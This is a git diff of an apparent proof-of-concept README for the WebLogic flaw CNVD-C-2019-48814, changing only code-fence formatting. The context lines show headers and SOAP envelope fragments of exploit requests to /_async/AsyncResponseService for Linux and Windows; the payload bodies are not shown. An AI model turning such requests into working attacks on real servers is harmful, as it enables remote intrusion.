@@ -1,7 +1,7 @@
 # CNVD-C-2019-48814
 CNVD-C-2019-48814 POC 集合
 1.Linux
-"""
+```
 POST /_async/AsyncResponseService HTTP/1.1
 Host: ip:port
 Content-Length: 853
@@ -35,9 +35,9 @@ content-type: text/xml
 <soapenv:Body>
 <asy:onAsyncDelivery/>
 </soapenv:Body></soapenv:Envelope>
-"""
+```
 2、Win
-"""
+```
 POST /_async/AsyncResponseService HTTP/1.1
 Host: ip:port
 Content-Length: 861
@@ -71,4 +71,4 @@ content-type: text/xml
 <soapenv:Body>
 <asy:onAsyncDelivery/>
 </soapenv:Body></soapenv:Envelope>
-"""
+```
